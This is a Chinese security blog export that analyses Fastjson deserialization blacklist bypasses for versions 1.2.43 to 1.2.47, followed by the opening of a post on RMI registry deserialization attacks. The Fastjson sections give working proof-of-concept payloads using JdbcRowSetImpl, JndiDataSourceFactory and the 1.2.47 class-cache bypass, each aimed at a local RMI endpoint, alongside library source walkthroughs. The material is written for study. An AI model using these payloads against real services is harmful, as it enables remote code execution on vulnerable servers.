<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8085/CalcTest&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>42</strong>列添加第二个**[<strong>，变成</strong>@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[**接着报错</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure></div>

<p>在<strong>43</strong>列添加**{<strong>，变成</strong>@type”:”[com.sun.rowset.JdbcRowSetImpl”[{**</p>
<p>成功执行</p>
<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p><strong>注：</strong>需开启<strong>autoTypeSupport</strong></p>
<p><strong>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h2><p>这个版本主要是修复了使用 <code>[&#123;</code> 绕过黑名单防护的问题</p>
<p>在<strong>com.alibaba.fastjson.parser.ParserConfig.checkAutoType</strong>中添加了新的判断，检测到类名以**[**开头直接抛出异常</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">    <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h2><p>增加了黑名单，存在组件漏洞，需要<strong>mybatis</strong>组件，版本在<strong>3.x.x ~ 3.5.0</strong></p>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>在<strong>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</strong>类下有个<strong>setProperties</strong>方法</p>
<p>在判断中可以得知，只要<strong>properties</strong>参数中存在<strong>data_source</strong>，可以调用<strong>JNDI</strong>，并传入<strong>data_source</strong>的值</p>
<p>而且也符合<strong>setter</strong>的要求</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    InitialContext initCtx;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> getEnvProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (env == <span class="literal">null</span>) &#123;</span><br><span class="line">      initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (properties.containsKey(INITIAL_CONTEXT)</span><br><span class="line">        &amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">      <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));</span><br><span class="line">      dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">      dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DataSourceException</span>(<span class="string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p><strong>注：</strong>需开启<strong>autoTypeSupport</strong></p>
<p><strong>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h2><p>这个<strong>Payload</strong>能过绕过<strong>checkAutoType</strong>内的各种检测</p>
<p>主要是通过<strong>Fastjson</strong>自带的缓存机制将<strong>恶意类</strong>加载到<strong>Mapping</strong>中，从而实现绕过</p>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="前半——将恶意类写入mapping缓存"><a href="#前半——将恶意类写入mapping缓存" class="headerlink" title="前半——将恶意类写入mapping缓存"></a>前半——将恶意类写入mapping缓存</h4><p>还是关注在<strong>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</strong>上</p>
<p>首先我们来看一下<strong>autoTypeSupport&#x3D;false</strong>的情况(默认不开启)</p>
<p>在<strong>autoTypeSupport</strong>不开启的情况下，会先跳过<strong>checkAutoType</strong>中的第一次<strong>黑白名单</strong>检测</p>
<p>然后在<strong>TypeUtils.mappings</strong>中和<strong>deserializers</strong>中尝试查找要反序列化的类，如果找到了，则就会<strong>return clazz</strong></p>
<p>这就避开下面<strong>autoTypeSupport&#x3D;false</strong>时的检查</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而<strong>com.alibaba.fastjson.parser.ParserConfig#initDeserializers</strong>中初始化<strong>deserializers</strong>的时候，会设置很多个类，其中就包括我们需要用到的<strong>java.lang.Class</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">    deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>重点关注在<strong>TypeUtils.getClassFromMapping</strong>方法中</p>
<p>从<strong>mapping</strong>中获取类名，下面我们就来看看<strong>mapping</strong>是在哪里赋值的，寻找<strong>mapping.put</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>找到是在<strong>com.alibaba.fastjson.util.TypeUtils#loadClass</strong>方法中</p>
<p>有还几处可以将类加载器加载并存入<strong>mappings</strong>中</p>
<p>也就是说如果我们可以控制参数的话，那么就有机会往<strong>mappings</strong>中写入<strong>任意类名</strong></p>
<p>所以，先找一下哪里调用了<strong>loadClass</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在<strong>com.alibaba.fastjson.serializer.MiscCodec#deserialze</strong>中</p>
<p>当<strong>clazz &#x3D;&#x3D; Class.class</strong>成立时会调用<strong>loadClass</strong></p>
<p><strong>clazz</strong>我们可以使用**@type<strong>传入，而</strong>strVal<strong>为我们需要的</strong>className**</p>
<p>可以看到<strong>strVal</strong>跟<strong>objVal</strong>有关，是强转赋值的</p>
<p>而<strong>objVal</strong>是在<strong>parser.parse()<strong>中截取而来，且参数名必须为</strong>val</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    Object objVal;</span><br><span class="line">    <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125; <span class="comment">//省略部分代码......</span></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    String strVal;</span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反过来看一下<strong>com.alibaba.fastjson.serializer.MiscCodec</strong>这个类</p>
<p>是一个序列化器和反序列化器</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiscCodec</span> <span class="keyword">implements</span> <span class="title class_">ObjectSerializer</span>, ObjectDeserializer</span><br></pre></td></tr></table></figure></div>

<h4 id="后半——从mapping中加载恶意类"><a href="#后半——从mapping中加载恶意类" class="headerlink" title="后半——从mapping中加载恶意类"></a>后半——从mapping中加载恶意类</h4><p>当我们第二次进入<strong>checkAutoType()<strong>的时候，就会从</strong>mapping</strong>中获取恶意类</p>
<h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;\&quot;1\&quot;:&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;\&quot;2\&quot;:&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</strong></p>
<ul>
<li><strong>autoTypeSupport &#x3D;&#x3D; false</strong>可利用</li>
</ul>
<p><strong>1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</strong></p>
<ul>
<li>不论<strong>autoTypeSupport &#x3D;&#x3D; true&#x2F;false</strong>都可利用</li>
</ul>
<p>受<strong>autoTypeSupport <strong>的原因还是在</strong>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</strong>上</p>
<p>当开启<strong>autoTypeSupport</strong>后，黑白名单的<strong>if</strong>判断语句有差异</p>
<p><strong>1.2.33</strong>版本后，多了句<strong>TypeUtils.getClassFromMapping(typeName) &#x3D;&#x3D; null</strong>，导致不会抛出异常</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="fastjson——1-2-68"><a href="#fastjson——1-2-68" class="headerlink" title="fastjson——1.2.68"></a>fastjson——1.2.68</h2><h1 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h1><p><a class="link"   href="https://goodapple.top/archives/832" >https://goodapple.top/archives/832 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80" >https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/" >https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro550</title>
    <url>/2023/09/27/Java%E5%AE%89%E5%85%A8/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Shiro550</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI(二)-攻击</title>
    <url>/2023/09/30/Java%E5%AE%89%E5%85%A8/RMI(%E4%BA%8C)%E2%80%94%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="0x01-RMI反序列化攻击"><a href="#0x01-RMI反序列化攻击" class="headerlink" title="0x01 RMI反序列化攻击"></a>0x01 RMI反序列化攻击</h1><h2 id="RMI交互方式"><a href="#RMI交互方式" class="headerlink" title="RMI交互方式"></a>RMI交互方式</h2><p>在RMI过程中，常常会涉及到以下5个交互方式，这几种方法位于<code>RegistryImpl_Skel.dispatch()</code>中，每种方式对应的case如下</p>
<ul>
<li>0-&gt;bind</li>
<li>1-&gt;list</li>
<li>2-&gt;lookup</li>
<li>3-&gt;rebind</li>
<li>4-&gt;unbind</li>
</ul>
<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>该方法用来列出Registry上绑定的远程对象</p>
<p>但是没有**readObject()**，所以无法利用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h3><p>该方法用于获取Registry上的一个远程对象</p>
<p>存在<strong>readObject()<strong>，不过必须为</strong>String</strong>类，不能直接利用，但是可以伪造请求连接</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p>该方法用来在<strong>Registry</strong>上绑定一个远程对象</p>
<p>存在<strong>readObject()<strong>，且需要为</strong>String</strong>和<strong>Remote</strong>类对象，所以我们可以将<strong>Object</strong>强转为<strong>Remote</strong>类型来利用</p>
